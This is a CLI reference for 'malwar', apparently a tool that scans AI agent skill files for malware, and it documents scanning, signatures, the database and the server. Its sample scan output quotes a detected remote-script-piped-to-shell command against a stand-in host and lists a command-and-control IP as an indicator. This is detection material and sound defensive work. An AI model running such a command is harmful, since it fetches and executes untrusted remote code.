<!-- Copyright (c) 2026 Veritas Aequitas Holdings LLC. All rights reserved. -->

# CLI Reference

## Overview

malwar provides a command-line interface built with Typer for scanning SKILL.md files, managing the database, working with threat signatures, and starting the API server.

**Installation:**

```bash
pip install malwar
```

After installation, the `malwar` command is available in your terminal.

**Global help:**

```bash
malwar --help
```

---

## Commands

### malwar scan

Scan a SKILL.md file, directory, or URL for malware.

**Usage:**

```bash
malwar scan <TARGET> [OPTIONS]
```

**Arguments:**

| Argument | Description |
|---|---|
| `TARGET` | Path to a SKILL.md file, a directory containing .md files, or a URL |

**Options:**

| Option | Short | Type | Default | Description |
|---|---|---|---|---|
| `--format` | `-f` | `console\|sarif\|json` | `console` | Output format |
| `--output` | `-o` | PATH | stdout | Write output to a file instead of stdout |
| `--no-llm` | -- | flag | false | Skip the LLM analysis layer (Layer 3) |
| `--no-urls` | -- | flag | false | Skip the URL crawling layer (Layer 2) |
| `--layers` | -- | string | all | Comma-separated list of layers to run |

**Examples:**

Scan a single file with console output:

```bash
malwar scan path/to/SKILL.md
```

Scan a directory of skills:

```bash
malwar scan tests/fixtures/skills/malicious/
```

Scan with JSON output saved to a file:

```bash
malwar scan SKILL.md --format json --output results.json
```

Generate SARIF output for CI integration:

```bash
malwar scan SKILL.md --format sarif --output results.sarif.json
```

Scan with only the rule engine (fastest, no network calls):

```bash
malwar scan SKILL.md --layers rule_engine
```

Scan without LLM analysis (saves API cost):

```bash
malwar scan SKILL.md --no-llm
```

Scan without URL crawling (no outbound HTTP):

```bash
malwar scan SKILL.md --no-urls
```

Run specific layers:

```bash
malwar scan SKILL.md --layers rule_engine,threat_intel
```

**Output formats:**

**Console (default):**
```
malwar v0.1.0 - Agentic Skills Malware Scanner

  Target:  tests/fixtures/skills/malicious/clawhavoc_amos.md
  SHA256:  a1b2c3d4e5f6...
  Skill:   ClawBot Crypto Helper
  Author:  zaycv

+-------------------------------------------------+
| VERDICT: MALICIOUS  (risk score: 100/100)       |
+-------------------------------------------------+

CRITICAL   MALWAR-MAL-001  ClawHavoc C2 IP address detected
           Line 18: 91.92.242.30
           Known ClawHavoc C2: 91.92.242.30
           Confidence: 0.99

CRITICAL   MALWAR-CMD-001  Remote script piped to shell
           Line 22: curl https://evil.com/setup.sh | bash
           Remote script piped to shell execution
           Confidence: 0.92

  Summary: 7 findings (3 critical, 2 high, 1 medium, 1 low)
  Layers:  rule_engine, url_crawler, threat_intel
  Duration: 1.2s
```

**JSON:** Full Pydantic model serialization of `ScanResult` with all fields.

**SARIF 2.1.0:** Standards-compliant Static Analysis Results Interchange Format for integration with GitHub Code Scanning, VS Code, and other tools.

---

### malwar serve

Start the malwar API server.

**Usage:**

```bash
malwar serve [OPTIONS]
```

**Options:**

| Option | Short | Type | Default | Description |
|---|---|---|---|---|
| `--host` | -- | string | `127.0.0.1` | Bind address |
| `--port` | `-p` | integer | `8000` | Bind port |
| `--workers` | `-w` | integer | `1` | Number of Uvicorn worker processes |

**Examples:**

Start with default settings (localhost:8000):

```bash
malwar serve
```

Start on all interfaces with multiple workers:

```bash
malwar serve --host 0.0.0.0 --port 9000 --workers 4
```

Start in development mode with debug logging:

```bash
MALWAR_LOG_LEVEL=DEBUG malwar serve
```

---

### malwar db init

Initialize the SQLite database with schema and seed data. Safe to run multiple times -- uses `CREATE TABLE IF NOT EXISTS` and `INSERT OR IGNORE`.

**Usage:**

```bash
malwar db init
```

**Example:**

```bash
$ malwar db init
Initializing database at malwar.db...
Database initialized with schema and seed data.
```

This creates all required tables (scans, findings, signatures, campaigns, publishers, url_analysis), indexes, and inserts seed data including the ClawHavoc campaign, its associated signatures, and known threat actor publisher records.

---

### malwar db stats

Display database statistics showing row counts for all tables.

**Usage:**

```bash
malwar db stats
```

**Example:**

```bash
$ malwar db stats
Database: malwar.db

  scans: 42 rows
  findings: 187 rows
  signatures: 4 rows
  campaigns: 1 rows
  publishers: 6 rows
  url_analysis: 0 rows
```

---

### malwar db-seed

Run seed data independently. Inserts campaign, signature, and publisher seed data. This is useful if you reset the database and need to re-populate threat intelligence without reinitializing.

**Usage:**

```bash
malwar db-seed
```

**Example:**

```bash
$ malwar db-seed
Seed data inserted successfully.
```

---

### malwar signature-list

List all threat signatures stored in the database.

**Usage:**

```bash
malwar signature-list
```

**Example output:**

```
                        Threat Signatures
+-----------------------------+--------------------+---------+---------+------+----------+---------+
| ID                          | Name               | Severity| Pattern | IOC  | Source   | Enabled |
|                             |                    |         | Type    | Type |          |         |
+-----------------------------+--------------------+---------+---------+------+----------+---------+
| sig-clawhavoc-c2-ip         | ClawHavoc C2 IP    | critical| exact   | ip   | clawhavoc| yes     |
| sig-clawhavoc-glot          | ClawHavoc Glot     | critical| exact   | url  | clawhavoc| yes     |
| sig-clawhavoc-github        | ClawHavoc GitHub   | critical| exact   | url  | clawhavoc| yes     |
| sig-clawhavoc-domain        | ClawHavoc Domain   | critical| exact   | domain| clawhavoc| yes    |
+-----------------------------+--------------------+---------+---------+------+----------+---------+
```

---

### malwar signature-add

Add a new threat signature to the database.

**Usage:**

```bash
malwar signature-add <PATTERN_TYPE> <PATTERN_VALUE> [OPTIONS]
```

**Arguments:**

| Argument | Description |
|---|---|
| `PATTERN_TYPE` | Pattern matching type: `regex`, `exact`, `fuzzy`, or `ioc` |
| `PATTERN_VALUE` | The pattern value to match against |

**Options:**

| Option | Short | Type | Default | Description |
|---|---|---|---|---|
| `--name` | `-n` | string | auto-generated | Human-readable signature name |
| `--severity` | `-s` | string | `medium` | Severity: critical, high, medium, low, info |
| `--category` | `-c` | string | `known_malware` | Threat category |
| `--ioc-type` | -- | string | null | IOC type: ip, domain, url, hash, email |
| `--campaign-id` | -- | string | null | Associated campaign ID |
| `--source` | -- | string | `manual` | Source of the signature |
| `--description` | `-d` | string | auto-generated | Signature description |

**Examples:**

Add a new C2 IP signature:

```bash
malwar signature-add exact "198.51.100.1" \
  --name "NewCampaign C2" \
  --severity critical \
  --category known_malware \
  --ioc-type ip \
  --description "C2 server observed in NewCampaign"
```

Add a regex signature for a domain pattern:

```bash
malwar signature-add regex "evil-domain-\d+\.example\.com" \
  --name "Rotating C2 Domains" \
  --severity high \
  --ioc-type domain \
  --campaign-id campaign-new-001
```

Add a simple exact match:

```bash
malwar signature-add exact "malicious-payload.com" -s critical -c known_malware
```

---

### malwar report-show

Show a detailed report for a previously completed scan.

**Usage:**

```bash
malwar report-show <SCAN_ID>
```

**Arguments:**

| Argument | Description |
|---|---|
| `SCAN_ID` | The unique scan identifier to display |

**Example:**

```bash
$ malwar report-show a1b2c3d4e5f6
+-------------------------------------------------+
|                   Scan Report                   |
+-------------------------------------------------+
| Scan ID:    a1b2c3d4e5f6                        |
| Skill:      ClawBot Crypto Helper               |
| Verdict:    MALICIOUS                           |
| Risk Score: 100/100                             |
| Severity:   critical                            |
| Timestamp:  2026-02-20T10:30:00+00:00           |
| Duration:   1.2s                                |
+-------------------------------------------------+

            Summary
+----------+-------+
| Severity | Count |
+----------+-------+
| critical |     3 |
| high     |     2 |
| medium   |     1 |
+----------+-------+

           Categories
+--------------------+-------+
| Category           | Count |
+--------------------+-------+
| known_malware      |     2 |
| suspicious_command  |     2 |
| data_exfiltration  |     1 |
| social_engineering |     1 |
+--------------------+-------+

                         Findings
+----------------+-----------------------------+----------+-----+------+------------+
| Rule ID        | Title                       | Severity | Conf| Line | Detector   |
+----------------+-----------------------------+----------+-----+------+------------+
| MALWAR-MAL-001 | ClawHavoc C2 IP detected    | critical | 0.99| 18   | rule_engine|
| MALWAR-CMD-001 | Remote script piped to shell | critical | 0.92| 22   | rule_engine|
| ...            | ...                         | ...      | ... | ...  | ...        |
+----------------+-----------------------------+----------+-----+------+------------+
```

---

### malwar version

Display the installed malwar version.

**Usage:**

```bash
malwar version
```

**Example:**

```bash
$ malwar version
malwar v0.1.0
```

---

## Environment Variables

All malwar configuration is done through environment variables with the `MALWAR_` prefix. Variables can be set in a `.env` file in the current directory.

| Variable | Default | Description |
|---|---|---|
| `MALWAR_DB_PATH` | `malwar.db` | Path to the SQLite database file |
| `MALWAR_API_HOST` | `127.0.0.1` | API server bind address |
| `MALWAR_API_PORT` | `8000` | API server bind port |
| `MALWAR_API_WORKERS` | `1` | Number of Uvicorn workers |
| `MALWAR_API_KEYS` | (empty) | Comma-separated API keys for authentication |
| `MALWAR_ANTHROPIC_API_KEY` | (empty) | Anthropic API key for LLM analysis |
| `MALWAR_LLM_MODEL` | `claude-sonnet-4-20250514` | LLM model to use |
| `MALWAR_LLM_MAX_TOKENS` | `4096` | Maximum tokens for LLM response |
| `MALWAR_LLM_TEMPERATURE` | `0.0` | LLM sampling temperature |
| `MALWAR_LLM_SKIP_BELOW_RISK` | `15` | Skip LLM if risk score is below this |
| `MALWAR_RATE_LIMIT_RPM` | `60` | API rate limit (requests per minute) |
| `MALWAR_CRAWLER_MAX_URLS` | `10` | Max URLs to fetch per scan |
| `MALWAR_CRAWLER_TIMEOUT` | `5.0` | URL fetch timeout in seconds |
| `MALWAR_CRAWLER_MAX_REDIRECTS` | `3` | Max HTTP redirects to follow |
| `MALWAR_CRAWLER_MAX_RESPONSE_BYTES` | `1048576` | Max response body size (1 MB) |
| `MALWAR_CRAWLER_CONCURRENCY` | `5` | Max concurrent URL fetches |
| `MALWAR_SCAN_MAX_FILE_SIZE` | `524288` | Max SKILL.md file size (512 KB) |
| `MALWAR_WEBHOOK_URLS` | (empty) | Comma-separated webhook URLs for notifications |
| `MALWAR_LOG_LEVEL` | `INFO` | Logging level (DEBUG, INFO, WARNING, ERROR) |
| `MALWAR_LOG_FORMAT` | `json` | Log format: `json` or `text` |

---

## Exit Codes

| Code | Meaning |
|---|---|
| 0 | Success |
| 1 | Error (target not found, parse failure, no .md files in directory) |
